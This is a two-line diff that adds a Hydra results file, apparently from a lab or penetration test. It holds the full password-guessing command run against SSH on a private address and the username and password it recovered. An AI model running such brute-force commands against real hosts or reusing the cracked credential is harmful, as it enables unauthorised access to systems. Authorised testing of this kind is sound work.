@@ -1,0 +1,2 @@
+# Hydra v9.8dev run at 2026-11-16 01:03:08 on 10.99.56.10 ssh (hydra -L web-users.txt -P web-passwords.txt -t 4 -o hydra-ssh.txt ssh://10.99.56.10)
+[22][ssh] host: 10.99.56.10   login: quill   password: Ink-Well-4
